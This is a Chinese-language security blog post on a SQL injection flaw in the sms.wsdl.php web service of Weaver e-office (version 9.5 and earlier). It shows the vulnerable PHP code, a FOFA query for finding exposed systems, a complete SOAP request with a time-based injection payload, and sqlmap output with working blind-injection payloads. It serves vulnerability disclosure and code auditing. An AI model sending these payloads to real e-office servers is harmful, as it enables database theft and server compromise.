---
title: "泛微e-office sms.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-sms-wsdl-sqli.html
asset_dir: assets/泛微e-office-sms.wsdl.php-sql注入漏洞
---

# 泛微e-office sms.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/18 18:40
- 645浏览
- [0评论](#comment)
- 53分钟阅读

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office sms.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

[![泛微e-office sms.wsdl.php sql注入漏洞](images/img-001-e13089c0e74c.webp)](https://image.mrxn.net/6f5786c6f8d841eda13eb275a55003f6.webp)

这里只拿第一个来简单过一遍

编程

[webservice](#)-json/sms/sms.wsdl.php 的 `cancelNotifySmsRemind` 业务逻辑如下

```
function cancelNotifySmsRemind( $notifyId, $UserInfor )
{
    $sms = authcheck( $UserInfor );
    if ( empty( $notifyId ) )
    {
        return 0;
    }
    $sms->cancelNotifySmsRemind( $notifyId );
    return 1;
}
```

`$UserInfor` 带入 `authcheck` 函数

```
function authCheck( $UserInfor )
{
    checkcurrentsession( );
    return new sms( $UserInfor );
}

public function __construct( $userInfo = array( ) )
    {
        global $connection;
        if ( $userInfo['user_id'] == "" )
        {
            $this->userid = $_SESSION['LOGIN_USER_ID'];
        }
        else
        {
            $this->userid = $userInfo['user_id'];
        }
        if ( $this->userid )
        {
            $sql = "SELECT DEPT_ID,USER_PRIV FROM user WHERE USER_ID='".$this->userid."'";
            $rs = exequery( $connection, $sql );
            $row = mysql_fetch_array( $rs );
            $this->deptid = $row['DEPT_ID'];
            $this->uesrpriv = $row['USER_PRIV'];
        }
        $this->curdate = date( "Y-m-d", time( ) );
        $this->curdatetime = date( "Y-m-d H:i:s", time( ) );
    }
```

`$userInfo['user_id']`被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，和之前的[泛微e-office notify.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html) 里一样。

代码安全审计

# 漏洞复现

```
POST /webservice-json/sms/sms.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:SmsServicewsdl#cancelNotifySmsRemind
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SmsServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:cancelNotifySmsRemind soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <notifyId xsi:type="xsd:string">1</notifyId>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1' AND 1094=BENCHMARK(5000000,MD5(0x706d4744))-- qpIp</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">quae divum incedo</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">verrantque per auras</session_id>
         </UserInfor>
      </urn:cancelNotifySmsRemind>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office sms.wsdl.php sql注入漏洞](images/img-002-148af01e57f4.webp)](https://image.mrxn.net/4f2a2ec276cf4fd69cae1e679f8e0089.webp)

成功在延时 5 秒

漏洞扫描服务

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 381 HTTP(s) requests:
---
Parameter: SOAP #2* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SmsServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:cancelNotifySmsRemind soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <notifyId xsi:type="xsd:string">1</notifyId>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1' RLIKE (SELECT (CASE WHEN (3536=3536) THEN 1 ELSE 0x28 END))-- kFbY</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">quae divum incedo</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">verrantque per auras</session_id>
         </UserInfor>
      </urn:cancelNotifySmsRemind>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SmsServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:cancelNotifySmsRemind soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <notifyId xsi:type="xsd:string">1</notifyId>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1' AND 1094=BENCHMARK(5000000,MD5(0x706d4744))-- qpIp</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">quae divum incedo</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">verrantque per auras</session_id>
         </UserInfor>
      </urn:cancelNotifySmsRemind>
   </soapenv:Body>
</soapenv:Envelope>
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
